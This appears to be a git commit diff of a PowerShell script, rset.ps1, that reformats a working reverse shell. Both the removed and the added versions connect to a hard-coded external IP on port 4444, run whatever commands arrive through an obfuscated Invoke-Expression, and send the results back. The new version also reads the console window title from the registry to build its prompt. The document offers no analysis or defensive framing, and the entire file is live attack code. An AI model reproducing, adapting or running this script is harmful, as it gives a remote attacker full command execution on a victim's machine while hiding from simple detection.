fe066c82103d21f0e222c540cfd629dce54b7947
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 03:20:54 +0530

    Update rset.ps1

--- rset.ps1
+++ rset.ps1
@@ -1,11 +1,18 @@
-$h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
-$i = "134.209.113.62";$p = 4444
-$c=New-Object ($h) ($i,$p);$s=$c.GetStream()
-$b=0..65535|%{0}
+$h='System.Net.Sockets.TcpClient'
+$i='134.209.113.62'
+$p=4444
+$a='System.Text.ASCIIEncoding'
+$c=New-Object ($h) ($i,$p)
+$s=$c.GetStream()
+$b=New-Object Byte[] 65536
+$e=New-Object ($a)
+
 while(($r=$s.Read($b,0,$b.Length)) -ne 0){
-$d=(New-Object ($a)).GetString($b,0,$r)
-$t=&('ie'+'x') $d 2>&1 | Out-String
-$t2=$t + ('PS ' + (pwd).Path + '> ')
-$m=[Text.Encoding]::ASCII.GetBytes($t2)
-$s.Write($m,0,$m.Length);$s.Flush()
-};$c.Close()
+    $d=$e.GetString($b,0,$r)
+    $t=&('ie'+'x') $d 2>&1 | Out-String
+    $t2=$t+('PS '+(gp 'HKCU:\Console').WindowTitle+'> ')
+    $m=$e.GetBytes($t2)
+    $s.Write($m,0,$m.Length)
+    $s.Flush()
+}
+$c.Close()
